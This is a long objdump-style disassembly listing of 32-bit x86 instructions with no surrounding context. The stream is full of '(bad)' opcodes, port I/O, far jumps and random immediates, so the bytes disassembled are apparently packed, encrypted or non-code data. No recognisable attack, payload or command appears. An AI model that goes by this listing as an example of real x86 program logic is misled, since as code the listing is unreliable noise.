  41b02f:	repz scas eax,DWORD PTR es:[edi]
  41b031:	mov    al,0x22
  41b033:	xchg   edi,eax
  41b034:	imul   ecx,DWORD PTR [edi],0x25
  41b037:	pop    eax
  41b038:	lods   al,BYTE PTR ds:[esi]
  41b039:	gs lahf 
  41b03b:	jp     0x41afee
  41b03d:	sahf   
  41b03e:	scas   eax,DWORD PTR es:[edi]
  41b03f:	dec    esp
  41b040:	shl    DWORD PTR [edx-0x78],cl
  41b043:	(bad)  
  41b046:	clc    
  41b047:	sbb    al,bh
  41b049:	icebp  
  41b04a:	imul   ebx,DWORD PTR [edx-0x73],0x183fb11a
  41b051:	cmp    eax,0xbdb5ba2d
  41b056:	int3   
  41b057:	and    al,0xb7
  41b059:	cwde   
  41b05a:	and    DWORD PTR [edx],edi
  41b05c:	pop    ecx
  41b05d:	repnz pop esi
  41b05f:	lods   al,BYTE PTR ds:[esi]
  41b060:	lea    edi,[ebx+eiz*4-0x57a47eb7]
  41b067:	xchg   esp,eax
  41b068:	imul   ebx,DWORD PTR [ecx],0x7433c633
  41b06e:	ja     0x41b020
  41b070:	loop   0x41b018
  41b072:	jmp    0x41b0ef
  41b074:	pop    ecx
  41b075:	pop    edi
  41b076:	mov    ch,0x2e
  41b078:	mov    ah,0x3a
  41b07a:	or     eax,0x1e671974
  41b07f:	repnz lock loop 0x41b05c
  41b083:	(bad)  
  41b084:	in     al,dx
  41b085:	fist   WORD PTR [edx+eiz*4-0x686ed9de]
  41b08c:	push   edi
  41b08d:	stos   BYTE PTR es:[edi],al
  41b08e:	mov    al,ds:0x3fa0fb94
  41b093:	in     al,0xbd
  41b095:	addr16 test al,0xf
  41b098:	mul    DWORD PTR [edx+0x1aec4da4]
  41b09e:	jbe    0x41b08c
  41b0a0:	mov    ds:0xde7f0ea8,al
  41b0a5:	or     BYTE PTR [ebx-0x79],bl
  41b0a8:	popa   
  41b0a9:	out    0xb8,al
  41b0ab:	in     al,dx
  41b0ac:	or     BYTE PTR [eax],0xaa
  41b0af:	mov    al,ds:0x357292eb
  41b0b4:	cmp    ecx,DWORD PTR [ecx+0x780002b6]
  41b0ba:	xchg   esi,eax
  41b0bb:	push   edi
  41b0bc:	adc    dh,BYTE PTR [esi+0x34]
  41b0bf:	imul   eax,DWORD PTR [eax-0x681e4c5a],0xffffffe7
  41b0c6:	test   al,0x55
  41b0c8:	sub    ebx,DWORD PTR [ecx+0x19]
  41b0cb:	mov    ebp,0x2568e8f8
  41b0d0:	daa    
  41b0d1:	lods   al,BYTE PTR gs:[esi]
  41b0d3:	mov    al,ds:0x88052baf
  41b0d8:	les    edx,FWORD PTR [esi+0xd]
  41b0db:	fs jns 0x41b13f
  41b0de:	xor    al,0xe2
  41b0e0:	fld    QWORD PTR [edi+0x21d7c381]
  41b0e6:	dec    ebx
  41b0e7:	repnz (bad) 
  41b0e9:	in     al,dx
  41b0ea:	sub    al,0x78
  41b0ec:	lods   al,BYTE PTR ds:[esi]
  41b0ed:	out    0xc9,al
  41b0ef:	cmc    
  41b0f0:	aam    0xed
  41b0f2:	xor    DWORD PTR [edx-0x7b83cd2e],edx
  41b0f8:	or     BYTE PTR [ecx-0x20be183f],bh
  41b0fe:	cli    
  41b0ff:	repz or edi,DWORD PTR [ebp-0x6096d24e]
  41b106:	sar    BYTE PTR [esi-0x71a27c13],cl
  41b10c:	inc    ebp
  41b10d:	and    esp,DWORD PTR [edi+0x28749f0d]
  41b113:	jbe    0x41b0c7
  41b115:	pop    edx
  41b116:	scas   al,BYTE PTR es:[edi]
  41b117:	and    cl,ah
  41b119:	aam    0x25
  41b11b:	hlt    
  41b11c:	mov    ds,WORD PTR [edi+edx*2+0x32186df9]
  41b123:	dec    esp
  41b124:	int    0xd3
  41b126:	sbb    al,dl
  41b128:	add    dl,BYTE PTR [ebx-0x6e]
  41b12b:	test   eax,0xc1f572f9
  41b130:	mov    dh,0xc
  41b132:	jge    0x41b1b3
  41b134:	lods   eax,DWORD PTR ds:[esi]
  41b135:	xor    al,0xf3
  41b137:	and    BYTE PTR [edx],bh
  41b139:	out    dx,eax
  41b13a:	jne    0x41b1a4
  41b13c:	dec    ebp
  41b13d:	data16 jp 0x41b16e
  41b140:	ins    DWORD PTR es:[edi],dx
  41b141:	sub    al,0x63
  41b143:	xchg   ecx,eax
  41b144:	das    
  41b145:	adc    DWORD PTR [ecx+0x2f],esi
  41b148:	jb     0x41b10f
  41b14a:	push   ebx
  41b14b:	sub    al,0x4b
  41b14d:	pop    ds
  41b14e:	cmp    BYTE PTR [edi+eiz*4],cl
  41b151:	imul   DWORD PTR [esi-0x41225e60]
  41b157:	add    DWORD PTR ds:0x13ce7dd0,esi
  41b15d:	mov    cl,0xf4
  41b15f:	xor    eax,0x8c5458a9
  41b164:	jo     0x41b19b
  41b166:	mov    bh,0x90
  41b168:	or     eax,DWORD PTR [edi-0x39434cb0]
  41b16e:	push   ebp
  41b16f:	jmp    0xd24d:0x9dd4a763
  41b176:	sub    BYTE PTR [edi+ecx*8],ah
  41b179:	call   0x30a3:0x28b38746
  41b180:	lds    edx,FWORD PTR [edi-0x1eb2de40]
  41b186:	imul   BYTE PTR [edi]
  41b188:	mov    ebx,0xb766b10c
  41b18d:	xor    eax,0x8fba216e
  41b192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b193:	aaa    
  41b194:	rdtsc  
  41b196:	enter  0x82c3,0x1d
  41b19a:	jo     0x41b195
  41b19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b19d:	stos   BYTE PTR es:[edi],al
  41b19e:	fwait
  41b19f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a0:	call   0x391540c9
  41b1a5:	out    0xef,eax
  41b1a7:	cs push 0xffffffe7
  41b1aa:	pop    ss
  41b1ab:	push   eax
  41b1ac:	mov    ?,ebx
  41b1ae:	(bad)  
  41b1af:	sahf   
  41b1b0:	stos   BYTE PTR es:[edi],al
  41b1b1:	outs   dx,DWORD PTR ds:[esi]
  41b1b2:	lock aad 0x3c
  41b1b5:	std    
  41b1b6:	sbb    edx,DWORD PTR [esi-0x18ed9460]
  41b1bc:	gs ffree st(6)
  41b1bf:	lea    esp,[ebx-0x15]
  41b1c2:	aaa    
  41b1c3:	inc    ecx
  41b1c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1c5:	mov    cl,0x50
  41b1c7:	inc    esi
  41b1c8:	push   ds
  41b1c9:	icebp  
  41b1ca:	out    dx,eax
  41b1cb:	inc    ebx
  41b1cc:	test   al,0xc1
  41b1ce:	fld    TBYTE PTR [edx+0x64]
  41b1d1:	ret    
  41b1d2:	xchg   edx,eax
  41b1d3:	push   edx
  41b1d4:	push   esp
  41b1d5:	js     0x41b1b6
  41b1d7:	icebp  
  41b1d8:	dec    esi
  41b1d9:	lds    edx,FWORD PTR [edx+eiz*1-0x26a88795]
  41b1e0:	lahf   
  41b1e1:	aaa    
  41b1e2:	aad    0xde
  41b1e4:	pushf  
  41b1e5:	lock mov ebx,0x3c3aa516
  41b1eb:	cmp    al,0xf3
  41b1ed:	cmp    al,0x29
  41b1ef:	and    bl,BYTE PTR [ebp+0x3a57673]
  41b1f5:	sbb    eax,DWORD PTR [eax]
  41b1f7:	push   esp
  41b1f8:	pop    eax
  41b1f9:	cmp    al,0x5b
  41b1fb:	push   es
  41b1fc:	repnz and DWORD PTR [ebx-0x30],eax
  41b200:	not    DWORD PTR [eax+eax*4]
  41b203:	in     al,dx
  41b204:	fstp   QWORD PTR [ebp-0x75]
  41b207:	jb     0x41b275
  41b209:	jl     0x41b26b
  41b20b:	lock xchg esi,eax
  41b20d:	not    ebx
  41b20f:	inc    edi
  41b210:	mov    esp,0xf339d2c9
  41b215:	loop   0x41b20d
  41b217:	jnp    0x41b235
  41b219:	xor    bl,BYTE PTR [ebx-0x3c]
  41b21c:	cmp    al,BYTE PTR [edi-0x582b176a]
  41b222:	sub    ebx,edx
  41b224:	aas    
  41b225:	es je  0x41b29c
  41b228:	outs   dx,DWORD PTR ds:[esi]
  41b229:	stos   BYTE PTR es:[edi],al
  41b22a:	push   ebp
  41b22b:	mov    esi,DWORD PTR [ecx+edx*4-0x80]
  41b22f:	mov    cl,0x36
  41b232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b233:	xchg   DWORD PTR [eax],edi
  41b235:	inc    esp
  41b236:	add    eax,0xb50111a0
  41b23b:	dec    edx
  41b23c:	sahf   
  41b23d:	lahf   
  41b23e:	jbe    0x41b1dd
  41b240:	test   al,0xe2
  41b242:	adc    al,ah
  41b244:	xchg   ecx,eax
  41b245:	call   0xd60c8c23
  41b24a:	pop    esi
  41b24b:	adc    DWORD PTR [ebx+0x6f8c7d22],ebp
  41b251:	rep stos DWORD PTR es:[edi],eax
  41b253:	push   cs
  41b254:	aas    
  41b255:	or     dh,BYTE PTR [ebp+0x1]
  41b258:	sbb    ebx,DWORD PTR [esp+eax*4]
  41b25b:	cmp    edi,DWORD PTR [ebp-0x45]
  41b25e:	sbb    edx,eax
  41b260:	test   eax,0x5d3e94cf
  41b265:	xchg   edi,eax
  41b266:	(bad)  
  41b267:	repnz in al,dx
  41b269:	push   ebp
  41b26a:	dec    ebx
  41b26b:	add    al,0xa3
  41b26d:	sbb    al,0xfd
  41b26f:	in     al,dx
  41b270:	(bad)  
  41b271:	mov    al,0x84
  41b273:	shl    DWORD PTR [edi-0x6860b302],1
  41b279:	iret   
  41b27a:	mov    bh,0xae
  41b27c:	loopne 0x41b2a1
  41b27e:	popa   
  41b27f:	cmp    DWORD PTR [eax],0x36
  41b282:	dec    edx
  41b283:	add    eax,0x5a6e0cce
  41b288:	and    BYTE PTR [ebx],0xcb
  41b28b:	pop    es
  41b28c:	xlat   BYTE PTR ds:[ebx]
  41b28d:	jno    0x41b280
  41b28f:	sub    al,0x9d
  41b291:	add    bl,bl
  41b293:	mov    WORD PTR [esi+0x5c],fs
  41b296:	ins    BYTE PTR es:[edi],dx
  41b297:	add    BYTE PTR [ecx],0x64
  41b29a:	add    bl,BYTE PTR [ebp+0x49eaf295]
  41b2a0:	rcl    BYTE PTR [esi+0x34d1d85f],0x76
  41b2a7:	mov    eax,0xc6a6a542
  41b2ac:	xor    ah,BYTE PTR [ecx+0xb7643e6]
  41b2b2:	add    DWORD PTR [edx],ebx
  41b2b4:	xchg   ebp,eax
  41b2b5:	mov    bh,0x1
  41b2b7:	call   0x9938:0x77d33409
  41b2be:	and    bh,ch
  41b2c0:	repz push ss
  41b2c2:	adc    DWORD PTR [ebx],edx
  41b2c4:	and    ebp,edx
  41b2c6:	sub    esi,edi
  41b2c8:	(bad)  
  41b2c9:	dec    esi
  41b2ca:	test   DWORD PTR [edi-0x2e],0xb4b92219
  41b2d1:	pop    edx
  41b2d2:	imul   ebx,edi,0xffffffd7
  41b2d5:	cmp    edx,DWORD PTR [ebx+esi*2+0x60]
  41b2d9:	xchg   DWORD PTR [edi-0x5e],esi
  41b2dc:	jecxz  0x41b276
  41b2de:	(bad)  
  41b2df:	jge    0x41b2fa
  41b2e1:	sbb    eax,0x7207967f
  41b2e6:	inc    ebp
  41b2e7:	push   eax
  41b2e8:	pop    ss
  41b2e9:	pop    ebx
  41b2ea:	popa   
  41b2eb:	nop
  41b2ec:	popf   
  41b2ed:	sub    al,0xea
  41b2ef:	cli    
  41b2f0:	pop    edx
  41b2f1:	and    al,0x86
  41b2f3:	mov    dh,0xad
  41b2f5:	clc    
  41b2f6:	loope  0x41b2c0
  41b2f8:	stos   BYTE PTR es:[edi],al
  41b2f9:	pop    ss
  41b2fa:	fdiv   st,st(2)
  41b2fc:	xchg   edx,eax
  41b2fd:	pop    ss
  41b2fe:	ins    BYTE PTR es:[edi],dx
  41b2ff:	jae    0x41b322
  41b301:	sub    al,0xc4
  41b303:	and    eax,0x803efbac
  41b308:	ret    
  41b309:	mov    edx,0x78e8f57c
  41b30e:	out    dx,al
  41b30f:	xor    eax,0x77dbbe55
  41b314:	inc    edi
  41b315:	add    al,0x93
  41b317:	(bad)  
  41b319:	aad    0x37
  41b31b:	mov    dl,0x15
  41b31d:	clc    
  41b31e:	add    al,0x3c
  41b320:	sub    DWORD PTR [eax+0x6a5e1d0c],edx
  41b326:	push   es
  41b327:	jge    0x41b2f3
  41b329:	ins    DWORD PTR es:[edi],dx
  41b32a:	xchg   DWORD PTR [edx-0x5a3f0b7a],ebp
  41b330:	repnz les ebp,FWORD PTR [ecx]
  41b333:	pop    esi
  41b334:	xchg   ebp,eax
  41b335:	ficom  WORD PTR [ebx+0x1ca788dd]
  41b33b:	outs   dx,DWORD PTR ds:[esi]
  41b33c:	sbb    eax,0xd516ce6e
  41b341:	dec    ecx
  41b342:	jnp    0x41b389
  41b344:	bound  esi,QWORD PTR [esp+ebx*1+0x6aa841b1]
  41b34b:	arpl   WORD PTR [ecx],ax
  41b34d:	mov    bl,0xad
  41b34f:	mov    al,ds:0x7b113d3b
  41b354:	popa   
  41b355:	fcomp  DWORD PTR [edi-0x2f]
  41b358:	sbb    dh,BYTE PTR [eax-0x199bda13]
  41b35e:	sub    DWORD PTR [edx],0xe8e09554
  41b364:	int3   
  41b365:	pop    es
  41b366:	sbb    DWORD PTR [ebx+ebx*8-0x582ecd3c],esp
  41b36d:	in     eax,dx
  41b36e:	pop    edx
  41b36f:	pop    ss
  41b370:	mov    ebp,0xd53ac71d
  41b375:	sbb    eax,0xd6d3260f
  41b37a:	das    
  41b37b:	mov    WORD PTR [ecx-0x45ce6f2f],es
  41b381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b382:	stos   BYTE PTR es:[edi],al
  41b383:	iret   
  41b384:	fld    DWORD PTR [ecx+edx*8]
  41b387:	mov    esp,0x39b9a1e0
  41b38c:	mov    ah,0x51
  41b38e:	push   cs
  41b38f:	push   ecx
  41b390:	sub    cl,BYTE PTR [edi+0x7d82b55e]
  41b396:	mov    BYTE PTR [edx+0x7b],bl
  41b399:	test   DWORD PTR [esi+0x2],edi
  41b39c:	cs repz inc esi
  41b39f:	lods   eax,DWORD PTR ds:[esi]
  41b3a0:	in     eax,0xfa
  41b3a2:	cmp    al,0x89
  41b3a4:	jg     0x41b413
  41b3a6:	jecxz  0x41b36d
  41b3a8:	xchg   edx,eax
  41b3a9:	repnz in eax,dx
  41b3ab:	mov    esi,gs
  41b3ad:	and    BYTE PTR [edi-0x4a],0x36
  41b3b1:	inc    esp
  41b3b2:	test   BYTE PTR [eax+0x58],dh
  41b3b5:	inc    ebp
  41b3b6:	lahf   
  41b3b7:	stos   BYTE PTR es:[edi],al
  41b3b8:	outs   dx,BYTE PTR ds:[esi]
  41b3b9:	pop    ss
  41b3ba:	or     eax,0x2669d267
  41b3bf:	xor    al,0xf
  41b3c1:	mov    esi,DWORD PTR [ebx]
  41b3c3:	or     eax,0x8e6dd0c
  41b3c8:	push   ebp
  41b3c9:	add    edi,ecx
  41b3cb:	ins    DWORD PTR es:[edi],dx
  41b3cc:	push   0x2eed31d2
  41b3d1:	and    eax,0xa40685df
  41b3d6:	sbb    ah,dh
  41b3d8:	push   esp
  41b3d9:	fs test DWORD PTR ds:[ebx-0x44d387d],edi
  41b3e1:	mov    dl,0xee
  41b3e3:	imul   eax,DWORD PTR [ecx+0x49cb29a2],0x42
  41b3ea:	jae    0x41b3ea
  41b3ec:	lock cwde 
  41b3ee:	inc    ebp
  41b3ef:	sub    eax,0x56ad1565
  41b3f4:	int3   
  41b3f5:	in     eax,0xee
  41b3f7:	pop    ecx
  41b3f8:	jno    0x41b400
  41b3fa:	and    ah,BYTE PTR [edx-0x63]
  41b3fd:	imul   edi,DWORD PTR [esi],0x8ea6f48a
  41b403:	(bad)  
  41b404:	cmp    al,0x71
  41b406:	mov    edi,DWORD PTR ds:[ebp+0x9]
  41b40a:	enter  0xb667,0xb7
  41b40e:	inc    ebp
  41b40f:	inc    ebp
  41b410:	xor    edi,DWORD PTR ds:[edx]
  41b413:	push   ebx
  41b414:	ins    DWORD PTR es:[edi],dx
  41b415:	out    dx,al
  41b416:	xchg   esi,eax
  41b417:	pushf  
  41b418:	popf   
  41b419:	adc    DWORD PTR [edi-0x53],eax
  41b41c:	add    ah,0x34
  41b41f:	pop    ss
  41b420:	or     DWORD PTR [ecx],ebx
  41b422:	int3   
  41b423:	clc    
  41b424:	cli    
  41b425:	xchg   eax,ebp
  41b427:	push   ebp
  41b428:	test   eax,0x2fe2e484
  41b42d:	push   ds
  41b42e:	imul   ecx,DWORD PTR [ecx-0x69],0x2183f6e4
  41b435:	mov    bl,BYTE PTR [eax]
  41b437:	(bad)  
  41b438:	fstp   DWORD PTR [edi-0x69]
  41b43b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b43c:	mov    edx,0xc8fac3f
  41b441:	(bad)  
  41b442:	scas   al,BYTE PTR es:[edi]
  41b443:	mov    ch,0x18
  41b445:	leave  
  41b446:	ds xchg esi,eax
  41b448:	fldcw  WORD PTR [esi-0xf9e7e6e]
  41b44e:	xchg   ebx,eax
  41b44f:	and    al,0xfa
  41b451:	jo     0x41b42b
  41b453:	jmp    0x3fede457
  41b458:	test   eax,0xf69b80bf
  41b45d:	aad    0x8
  41b45f:	sbb    edi,DWORD PTR [esi+0xb]
  41b462:	adc    al,0xc
  41b464:	or     BYTE PTR [edi-0x43669df6],dl
  41b46a:	call   0x17ef9e1f
  41b46f:	jbe    0x41b4b0
  41b471:	lea    edi,[eax-0x4e251411]
  41b477:	aad    0x86
  41b479:	push   edi
  41b47a:	rcl    BYTE PTR [esi-0x7a152b5a],cl
  41b480:	out    0x41,eax
  41b482:	pop    ss
  41b483:	out    dx,eax
  41b484:	repz fdiv DWORD PTR ds:0xd13cf615
  41b48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b48c:	cli    
  41b48d:	sub    edi,DWORD PTR [ebp+0x21536b63]
  41b493:	xor    eax,0xd3c29854
  41b498:	push   0xf3ec23b5
  41b49d:	push   ecx
  41b49e:	test   eax,0xb2b5309b
  41b4a3:	xchg   ebx,eax
  41b4a4:	push   0xd13c1e7e
  41b4a9:	or     al,al
  41b4ab:	mov    ?,WORD PTR [ebx]
  41b4ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ae:	xor    eax,0x615a4e6a
  41b4b3:	mov    ds:0x31503ebb,al
  41b4b8:	push   esi
  41b4b9:	dec    edi
  41b4ba:	mov    ebp,0x28ee06e1
  41b4bf:	sub    dl,BYTE PTR [ecx]
  41b4c1:	test   al,0xfb
  41b4c3:	mov    WORD PTR [edx-0x3],?
  41b4c6:	ret    
  41b4c7:	or     edx,DWORD PTR [edx]
  41b4c9:	pop    eax
  41b4ca:	pop    esp
  41b4cb:	lock jmp 0x73ad:0x99ecefd3
  41b4d3:	sbb    al,ch
  41b4d5:	clc    
  41b4d6:	pop    esp
  41b4d7:	jge    0x41b4aa
  41b4d9:	lea    ebp,[ebp+0x55]
  41b4dc:	clc    
  41b4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4de:	mov    edi,0xbed5eb66
  41b4e3:	mov    eax,0x9728439f
  41b4e8:	mov    cs,WORD PTR [edx]
  41b4ea:	sub    esp,ecx
  41b4ec:	addr16 push ss
  41b4ee:	adc    DWORD PTR [esi+eax*8+0x6ca0cdf5],edx
  41b4f5:	push   esp
  41b4f6:	jb     0x41b4e5
  41b4f8:	lahf   
  41b4f9:	nop
  41b4fa:	cmp    BYTE PTR [ebx+0x43855a6d],ah
  41b500:	aas    
  41b501:	repz dec ecx
  41b503:	lea    edx,[esi-0x1741cc1a]
  41b509:	fldcw  WORD PTR [esi+0x818ec04]
  41b50f:	je     0x41b503
  41b511:	imul   esp,DWORD PTR gs:[ebp-0x766eb38a],0xffffffc1
  41b519:	adc    eax,0x81d3b5f9
  41b51e:	gs jg  0x41b559
  41b521:	mov    al,0xf9
  41b523:	push   0xffffff9b
  41b525:	nop
  41b526:	mov    eax,0xf06943b3
  41b52b:	xchg   ecx,eax
  41b52c:	adc    BYTE PTR [ebx-0x73d7fa94],dl
  41b532:	jp     0x41b57e
  41b534:	and    eax,DWORD PTR [ebp-0x56]
  41b537:	stc    
  41b538:	jecxz  0x41b554
  41b53a:	(bad)  
  41b53b:	xchg   esi,eax
  41b53c:	inc    ecx
  41b53d:	pop    eax
  41b53e:	pop    esp
  41b540:	dec    esp
  41b541:	dec    ebx
  41b542:	xor    eax,0x9a4b9a0a
  41b547:	and    DWORD PTR [eax+0x26],ecx
  41b54a:	cli    
  41b54b:	icebp  
  41b54c:	aad    0x24
  41b54e:	xchg   esp,eax
  41b54f:	mov    edx,0xa1097714
  41b554:	sub    DWORD PTR [edi+0x8a8725],edx
  41b55a:	repnz idiv ebx
  41b55d:	xchg   edx,eax
  41b55e:	add    BYTE PTR [ecx],bl
  41b560:	std    
  41b561:	jno    0x41b580
  41b563:	mov    ch,0xba
  41b565:	rcl    cl,cl
  41b567:	jo     0x41b4eb
  41b569:	mov    ds:0xf14847d1,al
  41b56e:	fst    st(0)
  41b570:	nop
  41b571:	xor    bh,bh
  41b573:	std    
  41b574:	scas   eax,DWORD PTR es:[edi]
  41b575:	in     eax,0xc3
  41b577:	or     eax,ebp
  41b579:	scas   eax,DWORD PTR es:[edi]
  41b57a:	stos   DWORD PTR es:[edi],eax
  41b57b:	repnz loopne 0x41b5c7
  41b57e:	lock dec ebx
  41b580:	push   esp
  41b581:	mov    BYTE PTR [edi+0x52f42183],bh
  41b587:	adc    ebx,DWORD PTR [ecx]
  41b589:	ror    BYTE PTR [ebx-0x29],0x14
  41b58d:	mov    esp,0x56efe7c9
  41b592:	arpl   sp,cx
  41b594:	lods   al,BYTE PTR ds:[esi]
  41b595:	gs scas eax,DWORD PTR es:[edi]
  41b597:	std    
  41b598:	and    ah,dh
  41b59a:	cmp    ecx,DWORD PTR [ebx+ebp*4-0x72528b2d]
  41b5a1:	cmp    al,0xf2
  41b5a3:	aaa    
  41b5a4:	mov    bl,0xdc
  41b5a6:	xlat   BYTE PTR ds:[ebx]
  41b5a7:	ret    0x26a9
  41b5aa:	es inc ebp
  41b5ac:	aad    0x90
  41b5ae:	dec    eax
  41b5af:	mov    edi,0x5f57f92a
  41b5b4:	inc    esi
  41b5b5:	test   eax,0x10a0c0a8
  41b5ba:	jb     0x41b5b0
  41b5bc:	mov    esp,0x8d0436aa
  41b5c1:	shl    BYTE PTR [eax-0x6e],cl
  41b5c4:	lods   eax,DWORD PTR ds:[esi]
  41b5c5:	in     al,0x26
  41b5c7:	leave  
  41b5c8:	and    al,0x27
  41b5ca:	adc    DWORD PTR ds:0xbed7afda,edx
  41b5d0:	retf   0x92e1
  41b5d3:	loop   0x41b5a4
  41b5d5:	clc    
  41b5d6:	xchg   ecx,eax
  41b5d7:	inc    esp
  41b5d8:	sbb    al,0x2
  41b5da:	dec    edi
  41b5db:	and    BYTE PTR [edi-0x2559f5a],cl
  41b5e1:	mov    al,ds:0x8b1a6c40
  41b5e6:	outs   dx,BYTE PTR ds:[esi]
  41b5e7:	aad    0xab
  41b5e9:	add    DWORD PTR [ecx+0x3f],0x9172a676
  41b5f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5f1:	xor    bh,BYTE PTR [edx+0x3]
  41b5f4:	scas   al,BYTE PTR es:[edi]
  41b5f5:	out    dx,eax
  41b5f6:	das    
  41b5f7:	jmp    0xea64:0x82260286
  41b5fe:	inc    esp
  41b5ff:	cmp    BYTE PTR [esi+0x2e],ch
  41b602:	mov    ds:0x6985163,al
  41b607:	ja     0x41b5c7
  41b609:	push   eax
  41b60a:	fiadd  WORD PTR [esi+0x1f]
  41b60d:	stc    
  41b60e:	sub    eax,0x986fd48c
  41b613:	add    DWORD PTR [edi],ebp
  41b615:	pushf  
  41b616:	sbb    DWORD PTR [edi-0xa966d7],esp
  41b61c:	imul   edx,DWORD PTR [ecx+0x13593478],0x64
  41b623:	xor    edx,DWORD PTR [ebx+ecx*4-0x45a7f518]
  41b62a:	xchg   ebx,eax
  41b62b:	inc    edi
  41b62c:	pop    ss
  41b62d:	or     eax,0xd0dbc076
  41b632:	iret   
  41b633:	add    al,0x5f
  41b635:	jb     0x41b5f3
  41b637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b638:	loopne 0x41b643
  41b63a:	es daa 
  41b63c:	or     al,BYTE PTR [eax+0x4]
  41b63f:	dec    edi
  41b640:	cld    
  41b641:	add    BYTE PTR [ecx],bl
  41b643:	(bad)  
  41b644:	mov    bl,0x40
  41b646:	in     al,0x46
  41b648:	mov    dh,0xe3
  41b64a:	(bad)  
  41b64b:	xchg   esp,eax
  41b64c:	(bad)  
  41b64d:	retf   0x3e3a
  41b650:	in     al,dx
  41b651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b652:	addr16 ss xchg ecx,eax
  41b655:	in     eax,dx
  41b656:	fwait
  41b657:	in     al,0xa4
  41b659:	mov    ah,0x3d
  41b65b:	dec    esi
  41b65c:	ja     0x41b645
  41b65e:	push   cs
  41b65f:	lock mov esp,0xbd398764
  41b665:	cld    
  41b666:	inc    ebx
  41b667:	das    
  41b668:	imul   edi,DWORD PTR [ebp-0x3bc84dfe],0x34
  41b66f:	call   0xe602:0x411a7bd4
  41b676:	lahf   
  41b677:	add    dl,bh
  41b679:	arpl   WORD PTR [edi],bp
  41b67b:	adc    al,0xe5
  41b67d:	xchg   ebx,eax
  41b67e:	sub    edx,DWORD PTR [eax]
  41b680:	xor    ch,bh
  41b682:	mov    bl,0xb0
  41b684:	dec    ebp
  41b685:	jmp    0xd9f4:0x8d3b71ea
  41b68c:	(bad)  
  41b68d:	addr16 jnp 0x41b634
  41b690:	mov    bh,0xba
  41b692:	stc    
  41b693:	sbb    cl,ah
  41b695:	outs   dx,BYTE PTR ds:[esi]
  41b696:	xor    al,0xd
  41b698:	inc    esi
  41b699:	xlat   BYTE PTR ds:[ebx]
  41b69a:	call   0x91df:0x9d460aea
  41b6a1:	ins    BYTE PTR es:[edi],dx
  41b6a2:	leave  
  41b6a3:	sar    edx,0xfb
  41b6a6:	mov    edi,0xfe14d0e6
  41b6ab:	pop    ebx
  41b6ac:	jecxz  0x41b63c
  41b6ae:	stos   DWORD PTR es:[edi],eax
  41b6af:	int    0x90
  41b6b1:	jns    0x41b708
  41b6b3:	jnp    0x41b651
  41b6b5:	or     eax,0xc21a2c05
  41b6ba:	out    0x44,eax
  41b6bc:	outs   dx,DWORD PTR ds:[esi]
  41b6bd:	stos   BYTE PTR es:[edi],al
  41b6be:	xchg   edx,eax
  41b6bf:	sar    BYTE PTR [ecx+0x4622dd6],1
  41b6c5:	call   0x9a2e:0x22326d81
  41b6cc:	push   ss
  41b6cd:	(bad)
  41b6d0:	or     BYTE PTR [eax],0xfa
  41b6d3:	std    
  41b6d4:	imul   al
  41b6d6:	fistp  QWORD PTR [ebx+0x72]
  41b6d9:	ret    0x1f86
  41b6dc:	pop    es
  41b6dd:	rcl    dh,cl
  41b6df:	jnp    0x41b74e
  41b6e1:	(bad)  
  41b6e2:	fcom   QWORD PTR [esi+0x17]
  41b6e5:	mov    edi,0x25659601
  41b6ea:	dec    ecx
  41b6eb:	jmp    0xcd67:0x798246da
  41b6f2:	scas   al,BYTE PTR es:[edi]
  41b6f3:	inc    esp
  41b6f4:	add    DWORD PTR [ebp+0x57774c92],eax
  41b6fa:	icebp  
  41b6fb:	popa   
  41b6fc:	sub    DWORD PTR ss:[edx],ecx
  41b6ff:	ror    DWORD PTR [edx],cl
  41b701:	push   cs
  41b702:	(bad)  
  41b704:	inc    ecx
  41b705:	(bad)  
  41b706:	mov    ch,0x29
  41b708:	dec    edi
  41b709:	xor    bl,BYTE PTR [ecx+eax*8]
  41b70c:	jae    0x41b740
  41b70e:	in     al,0x25
  41b710:	ret    0xdcc0
  41b713:	int3   
  41b714:	or     eax,DWORD PTR [ecx-0x5d809152]
  41b71a:	pop    eax
  41b71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b71c:	or     BYTE PTR [edx*8-0x44a8641f],cl
  41b723:	(bad)  
  41b724:	cmp    ah,BYTE PTR [edi+0x5405110e]
  41b72a:	into   
  41b72b:	sub    eax,DWORD PTR [esi+0x7f9df2b8]
  41b731:	push   cs
  41b732:	mov    ecx,0xb7874059
  41b737:	scas   al,BYTE PTR es:[edi]
  41b738:	pop    esi
  41b739:	pop    esi
  41b73a:	jp     0x41b711
  41b73c:	pop    edx
  41b73d:	jae    0x41b715
  41b73f:	mov    esp,0x929c89f2
  41b744:	stos   BYTE PTR es:[edi],al
  41b745:	dec    ebx
  41b746:	fidiv  WORD PTR [ebx+ecx*2+0x0]
  41b74a:	jae    0x41b704
  41b74c:	mov    cl,0xf3
  41b74e:	inc    eax
  41b74f:	adc    DWORD PTR [esp+edi*1],esi
  41b752:	mov    edi,0x408080c
  41b757:	xor    al,0xc3
  41b759:	fsubr  QWORD PTR [ecx+0x22]
  41b75c:	mov    bl,cl
  41b75e:	and    eax,0x973d0a74
  41b763:	mov    al,0x32
  41b765:	lds    esi,FWORD PTR [ebx]
  41b767:	outs   dx,DWORD PTR ds:[esi]
  41b768:	jae    0x41b7e1
  41b76a:	pop    ebx
  41b76b:	jae    0x41b72b
  41b76d:	stos   DWORD PTR es:[edi],eax
  41b76e:	in     al,dx
  41b76f:	mov    WORD PTR [edx],?
  41b771:	in     eax,dx
  41b772:	repz cs mov edi,0xc5f25711
  41b779:	pop    eax
  41b77a:	popf   
  41b77b:	cmc    
  41b77c:	xchg   ebx,eax
  41b77d:	es push edi
  41b77f:	rcr    dh,0x63
